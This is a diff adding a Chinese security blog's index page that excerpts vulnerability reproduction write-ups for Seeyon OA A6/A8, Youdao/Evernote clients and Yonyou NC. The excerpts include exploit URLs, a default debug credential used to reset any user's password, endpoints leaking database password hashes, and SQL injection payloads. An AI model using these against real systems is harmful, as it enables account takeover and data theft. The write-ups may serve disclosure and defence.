@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/2/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-致远oa/致远OA A8 任意用户密码修改漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A8%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.828Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="致远OA-A8-任意用户密码修改漏洞"><a href="#致远OA-A8-任意用户密码修改漏洞" class="headerlink" title="致远OA A8 任意用户密码修改漏洞"></a>致远OA A8 任意用户密码修改漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>致远OA A8</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://www.0-sec.org/seeyon/services/authorityService?wsdl
+</code></pre>
+<p>通过调试接口的默认用户 userName:service-admin password:123456<br>获取万能Token之后可以修改任意用户密码。</p>
+<p><img src="/resource/%E8%87%B4%E8%BF%9COAA8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>访问</p>
+<pre><code>http://www.0-sec.org/seeyon/getAjaxDataServlet?S=ajaxOrgManager&amp;M=isOldPasswordCorrect&amp;CL=true&amp;RVT=XML&amp;P_1_String=zw&amp;P_2_String=wooyun
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A8%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A8%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r20s00rwy8v1d4ua9hci" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-致远oa/致远OA A6 重置数据库账号密码漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20%E9%87%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.826Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="致远OA-A6-重置数据库账号密码漏洞"><a href="#致远OA-A6-重置数据库账号密码漏洞" class="headerlink" title="致远OA A6 重置数据库账号密码漏洞"></a>致远OA A6 重置数据库账号密码漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>致远OA A6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="重置数据库账号密码防御"><a href="#重置数据库账号密码防御" class="headerlink" title="重置数据库账号密码防御"></a>重置数据库账号密码防御</h3><pre><code>http://www.0-sec.org/yyoa/ext/byoa/start.jsp
+</code></pre>
+<p>该文件的代码为：</p>
+<pre><code>&lt;%    Connection conn = null;    PreparedStatement pstmt = null;    String sql = &quot;create user byoa IDENTIFIED by &#39;byoa&#39;&quot;;    try &#123;        conn = null;//net.btdz.oa.common.ConnectionPoolBean.getConnection();        pstmt = conn.prepareStatement(sql);        out.print(pstmt.executeUpdate());        sql = &quot;grant all on *.* to byoa&quot;;        pstmt = conn.prepareStatement(sql);        out.println(pstmt.executeUpdate());        pstmt.close();        sql = &quot;update mysql.user set password=password(&#39;byoa&#39;) where user=&#39;byoa&#39;&quot;;        pstmt = conn.prepareStatement(sql);        out.println(pstmt.executeUpdate());        pstmt.close();        sql = &quot;flush privileges&quot;;        pstmt = conn.prepareStatement(sql);        out.print(pstmt.executeUpdate());        pstmt.close();        //conn.close();    &#125; catch (Exception ex) &#123;                    out.println(ex.getMessage());    &#125;%&gt;
+</code></pre>
+<p>可以抛光该文件没有验证任何权限，便进行了重置数据库用户byoa的密码为：byoa</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20%E9%87%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20%E9%87%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r20r00ruy8v1hkqz1067" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-致远oa/致远OA A6 敏感信息泄露（二）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.824Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="致远OA-A6-敏感信息泄露（二）"><a href="#致远OA-A6-敏感信息泄露（二）" class="headerlink" title="致远OA A6 敏感信息泄露（二）"></a>致远OA A6 敏感信息泄露（二）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>致远OA A6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h5 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置:"></a>漏洞位置:</h5><pre><code>http://www.0-sec.org/yyoa/DownExcelBeanServlet
+</code></pre>
+<h5 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><pre><code>版本:A6只有系统管理才有的权限，但是任意用户都可以访问。可以下载所有员工的个人信息，包括身份证、联系方式、职位等敏感信息。
+</code></pre>
+<h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式:"></a>请求方式:</h5>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%BA%8C%EF%BC%89/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%BA%8C%EF%BC%89/" data-id="cl5c2r20r00rvy8v1gamyaxyb" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-致远oa/致远OA A6 敏感信息泄露（一）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.821Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="致远OA-A6-敏感信息泄露（一）"><a href="#致远OA-A6-敏感信息泄露（一）" class="headerlink" title="致远OA A6 敏感信息泄露（一）"></a>致远OA A6 敏感信息泄露（一）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞泄露了数据库用户的账号，密码hash。访问该文件直接执行了Select *<br>from mysql.user;并回显</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>致远OA A6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h5 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置:"></a>漏洞位置:</h5><pre><code>http://www.0-sec.org/yyoa/createMysql.jsp
+
+http://www.0-sec.org/yyoa/ext/createMysql.jsp
+</code></pre>
+<p>回显内容：</p>
+<pre><code>root
+
+*1532B21FE550E115F113DAA9A26D0EEEEF8DEDC
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%80%EF%BC%89/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="cl5c2r20q00rsy8v17el81v9e" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-致远oa/致远OA A6 test.jsp sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.818Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="致远OA-A6-test-jsp-sql注入漏洞"><a href="#致远OA-A6-test-jsp-sql注入漏洞" class="headerlink" title="致远OA A6 test.jsp sql注入漏洞"></a>致远OA A6 test.jsp sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>致远A6协同系统 <code>/yyoa/common/js/menu/test.jsp</code> 文件 S1 参数SQL注入漏洞</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>致远OA A6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>注入点为S1变量，通过探测，发现是mysql数据库</p>
+<pre><code>http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=
+</code></pre>
+<p>于是构造注入语句查询数据库名：</p>
+<pre><code>http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20database())
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r20r00rty8v10pw2ee9a" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-致远oa/致远OA A6 setextno.jsp sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.815Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="致远OA-A6-setextno-jsp-sql注入漏洞"><a href="#致远OA-A6-setextno-jsp-sql注入漏洞" class="headerlink" title="致远OA A6 setextno.jsp sql注入漏洞"></a>致远OA A6 setextno.jsp sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>用友致远A6协同系统SQL注入，union可shell</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>致远OA A6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h5 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置:"></a>漏洞位置:</h5><pre><code>http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp
+</code></pre>
+<h5 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><pre><code>版本：A6用友致远A6协同系统SQL注入，union可shell
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r20q00rry8v1bvlsftxn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-致远oa/致远OA A6 search_result.jsp sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20search_result.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.813Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="致远OA-A6-search-result-jsp-sql注入漏洞"><a href="#致远OA-A6-search-result-jsp-sql注入漏洞" class="headerlink" title="致远OA A6 search_result.jsp sql注入漏洞"></a>致远OA A6 search_result.jsp sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>致远OA A6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h5 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置:"></a>漏洞位置:</h5><pre><code>/yyoa/oaSearch/search_result.jsp
+</code></pre>
+<h5 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><pre><code>版本：A6
+注意：需登录账户
+注入发生在search_result.jsp文件中的docTitle参数
+</code></pre>
+<h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式:"></a>请求方式:</h5>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20search_result.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A6%20search_result.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r20q00rqy8v13kev4ihq" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-致远oa/致远 OA A8 htmlofficeservlet getshell 漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9C%20OA%20A8%20htmlofficeservlet%20getshell%20%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.811Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="致远-OA-A8-htmlofficeservlet-getshell-漏洞"><a href="#致远-OA-A8-htmlofficeservlet-getshell-漏洞" class="headerlink" title="致远 OA A8 htmlofficeservlet getshell 漏洞"></a>致远 OA A8 htmlofficeservlet getshell 漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>访问<a target="_blank" rel="noopener" href="https://wiki.0-sec.org/img">https://wiki.0-sec.org/img</a><br>src=&quot;<a target="_blank" rel="noopener" href="https://wiki.0-sec.org/img/19f51e83094c4ce79a3da658a24f961b.png/&quot;">https://wiki.0-sec.org/img/19f51e83094c4ce79a3da658a24f961b.png\&quot;</a><br>alt=&quot;1.png&quot; class=&quot;large&quot; onclick=&quot;window.open(this.src)&quot; /&gt;</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>致远A8-V5协同管理软件 V6.1sp1</p>
+<p>致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3</p>
+<p>致远A8+协同管理软件 V7.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h3><pre><code>https://www.0-sec.org/seeyon/htmlofficeservlet/seeyon/index.jsp
+seeyon
+Fofa：app=&quot;用友-致远OA&quot;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9C%20OA%20A8%20htmlofficeservlet%20getshell%20%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9C%20OA%20A8%20htmlofficeservlet%20getshell%20%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r20m00roy8v167dq64tv" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-有道云笔记/有道云笔记_印象笔记 windows客户端代码执行&amp;本地文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0_%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0%20windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.782Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="有道云笔记-印象笔记-windows客户端代码执行-amp-本地文件读取"><a href="#有道云笔记-印象笔记-windows客户端代码执行-amp-本地文件读取" class="headerlink" title="有道云笔记/印象笔记 windows客户端代码执行&amp;本地文件读取"></a>有道云笔记/印象笔记 windows客户端代码执行&amp;本地文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>构造一个pdf，UF处是执行的地方，输入iexplore表示打开ie</p>
+<p><img src="/resource/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0_%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId24.png"></p>
+<p>在客户端上传就会触发：</p>
+<p><img src="/resource/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0_%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId25.png"></p>
+<p>打开cmd</p>
+<p><img src="/resource/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0_%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId26.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0_%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0%20windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0_%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0%20windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2r20p00rpy8v1bwlk59cs" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-用友nc/用友nc 6.5 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8Bnc%206.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.688Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="用友nc-6-5-反序列化漏洞"><a href="#用友nc-6-5-反序列化漏洞" class="headerlink" title="用友nc 6.5 反序列化漏洞"></a>用友nc 6.5 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>用友nc 6.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li>  1.执行NC安装包根目录下setup.bat文件（要求安装盘同级目下有ufjdk文件或者设置JAVA_HOME环境变量），安装时，出现如下图界面;</li>
+</ul>
